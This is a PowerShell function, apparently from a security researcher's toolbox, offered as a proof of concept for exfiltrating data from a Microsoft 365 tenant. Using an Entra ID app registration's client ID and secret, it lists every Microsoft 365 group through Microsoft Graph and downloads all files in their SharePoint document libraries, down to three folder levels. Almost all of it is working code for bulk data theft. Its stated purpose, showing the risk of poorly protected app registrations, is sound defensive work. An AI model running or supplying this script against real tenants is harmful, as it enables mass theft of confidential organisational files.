
function Invoke-DCM365DataExfiltration {
    <#
        .SYNOPSIS
            This script uses an Entra ID app registration to download all files from all M365 groups (Teams) document libraries in a tenant.

        .DESCRIPTION
            This script is a proof of concept and for testing purposes only. Do not use this script in an unethical or unlawful way. Don’t be stupid!

            This script showcase how an attacker can exfiltrate huge amounts of files from a Microsoft 365 tenant, using a poorly protected Entra ID app registration with any of the following Microsoft Graph permissions:

            - Files.Read.All
            - Files.ReadWrite.All
            - Sites.Read.All
            - Sites.ReadWrite.All

            Also, one of the following permissions is required to enumerate M365 groups and SharePoint document libraries:

            - GroupMember.Read.All
            - Group.Read.All
            - Directory.Read.All
            - Group.ReadWrite.All
            - Directory.ReadWrite.All

            The script will loop through all M365 groups and their SharePoint Online document libraries (used by Microsoft Teams for storing files) and download all files it can find, down to three folder levels. The files will be downloaded to the current directory.

            A list of downloaded files will be copied to the clipboard after completion.

            You can run the script with -WhatIf to skip the actual downloads. It will still show the output and what would have been downloaded.

        .PARAMETER ClientID
            Client ID for your Entra ID application.

        .PARAMETER ClientSecret
            Client secret for the Entra ID application.

        .PARAMETER TenantName
            The name of your tenant (example.onmicrosoft.com).

        .PARAMETER WhatIf
            Skip the actual downloads. It will still show the output and what would have been downloaded.

        .EXAMPLE
            Invoke-M365DataExfiltration -ClientID '8a85d2cf-17c7-4ecd-a4ef-05b9a81a9bba' -ClientSecret 'j[BQNSi29Wj4od92ritl_DHJvl1sG.Y/' -TenantName 'example.onmicrosoft.com'

        .EXAMPLE
            Invoke-M365DataExfiltration -ClientID '8a85d2cf-17c7-4ecd-a4ef-05b9a81a9bba' -ClientSecret 'j[BQNSi29Wj4od92ritl_DHJvl1sG.Y/' -TenantName 'example.onmicrosoft.com' -WhatIf

        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
	#>


    param (
        [parameter(Mandatory = $true)]
        [string]$ClientID,

        [parameter(Mandatory = $true)]
        [string]$ClientSecret,

        [parameter(Mandatory = $true)]
        [string]$TenantName,

        [parameter(Mandatory = $false)]
        [switch]$WhatIf
    )


    # WhatIf.
    if ($WhatIf) {
        Write-Verbose -Verbose -Message "NOTE: -WhatIf was declared. Simulating run (no files will be downloaded)!"
    }


    # Connect to Microsoft Graph with application credentials.
    Write-Verbose -Verbose -Message "Connecting to Microsoft Graph as Service Principal '$ClientID'..."
    $Parameters = @{
        ClientID = $ClientID
        ClientSecret = $ClientSecret
        TenantName = $TenantName
    }

    $AccessToken = Connect-DCMsGraphAsApplication @Parameters


    # GET all Microsoft 365 Groups.
    Write-Verbose -Verbose -Message "Fetching all Microsoft 365 groups (Teams)..."
    $Parameters = @{
        AccessToken = $AccessToken
        GraphMethod = 'GET'
        GraphUri = "https://graph.microsoft.com/v1.0/groups?`$filter=groupTypes/any(c:c+eq+'Unified')&`$select=id,displayName,description"
    }

    $M365Groups = Invoke-DCMsGraphQuery @Parameters
    Write-Verbose -Verbose -Message "Found $($M365Groups.Count) Microsoft 365 groups."


    # GET all related SharePoint document libraries.
    Write-Verbose -Verbose -Message "Loading related SharePoint document libraries..."
    $DocumentLibraries = foreach ($Group in $M365Groups) {
        $Parameters = @{
            AccessToken = $AccessToken
            GraphMethod = 'GET'
            GraphUri = "https://graph.microsoft.com/v1.0/groups/$($Group.id)/drive?`$select=id,name,webUrl"
        }

        Invoke-DCMsGraphQuery @Parameters
    }
    Write-Verbose -Verbose -Message "Done! Starting download job NOW..."


    # DOWNLOAD files in the document libraries (root level + three folder levels down).
    $Files = foreach ($DocumentLibrary in $DocumentLibraries) {
        Write-Verbose -Verbose -Message "--- Looking in '$($DocumentLibrary.webUrl)'..."

        $Parameters = @{
            AccessToken = $AccessToken
            GraphMethod = 'GET'
            GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/root/children"
        }

        $RootContent = Invoke-DCMsGraphQuery @Parameters
        $RootContent | where file

        # Download files in root directory.
        foreach ($File in ($RootContent | where file)) {
            Write-Verbose -Verbose -Message "------ Downloading '$($File.Name)' ($([math]::round($File.Size/1MB, 2)) MB)..."

            $HeaderParams = @{
                'Content-Type'  = "application\json"
                'Authorization' = "Bearer $AccessToken"
            }

            if (!($WhatIf)) {
                Invoke-RestMethod -Headers $HeaderParams -Uri $File."@microsoft.graph.downloadUrl" -UseBasicParsing -Method GET -ContentType "application/json" -OutFile $File.Name
            }
        }

        foreach ($Item in ($RootContent | where folder)) {
            $Parameters = @{
                AccessToken = $AccessToken
                GraphMethod = 'GET'
                GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($Item.id)/children"
            }

            $SubContentLevel1 = Invoke-DCMsGraphQuery @Parameters
            $SubContentLevel1 | where file

            # Download files in sub SubContentLevel1.
            foreach ($File in ($SubContentLevel1 | where file)) {
                Write-Verbose -Verbose -Message "------ Downloading '$($File.Name)' ($([math]::round($File.Size/1MB, 2)) MB)..."

                $HeaderParams = @{
                    'Content-Type'  = "application\json"
                    'Authorization' = "Bearer $AccessToken"
                }

                if (!($WhatIf)) {
                    Invoke-RestMethod -Headers $HeaderParams -Uri $File."@microsoft.graph.downloadUrl" -UseBasicParsing -Method GET -ContentType "application/json" -OutFile $File.Name
                }
            }

            # Go through folders in SubContentLevel1.
            foreach ($Item in ($SubContentLevel1 | where folder)) {
                $Parameters = @{
                    AccessToken = $AccessToken
                    GraphMethod = 'GET'
                    GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($Item.id)/children"
                }

                $SubContentLevel2 = Invoke-DCMsGraphQuery @Parameters
                $SubContentLevel2 | where file

                # Download files in sub SubContentLevel2.
                foreach ($File in ($SubContentLevel2 | where file)) {
                    Write-Verbose -Verbose -Message "------ Downloading '$($File.Name)' ($([math]::round($File.Size/1MB, 2)) MB)..."

                    $HeaderParams = @{
                        'Content-Type'  = "application\json"
                        'Authorization' = "Bearer $AccessToken"
                    }

                    if (!($WhatIf)) {
                        Invoke-RestMethod -Headers $HeaderParams -Uri $File."@microsoft.graph.downloadUrl" -UseBasicParsing -Method GET -ContentType "application/json" -OutFile $File.Name
                    }
                }

                # Go through folders in SubContentLevel2.
                foreach ($Item in ($SubContentLevel2 | where folder)) {
                    $Parameters = @{
                        AccessToken = $AccessToken
                        GraphMethod = 'GET'
                        GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($Item.id)/children"
                    }

                    $SubContentLevel3 = Invoke-DCMsGraphQuery @Parameters
                    $SubContentLevel3 | where file

                    # Download files in sub SubContentLevel3.
                    foreach ($File in ($SubContentLevel3 | where file)) {
                        Write-Verbose -Verbose -Message "------ Downloading '$($File.Name)' ($([math]::round($File.Size/1MB, 2)) MB)..."

                        $HeaderParams = @{
                            'Content-Type'  = "application\json"
                            'Authorization' = "Bearer $AccessToken"
                        }

                        if (!($WhatIf)) {
                            Invoke-RestMethod -Headers $HeaderParams -Uri $File."@microsoft.graph.downloadUrl" -UseBasicParsing -Method GET -ContentType "application/json" -OutFile $File.Name
                        }
                    }
                }
            }
        }
    }


    # Copy result to clipboard and exit.
    $Files | Select-Object Name,size | Set-Clipboard
    Write-Verbose -Verbose -Message "File list copied to clipboard!"
    Write-Verbose -Verbose -Message "All done!"
}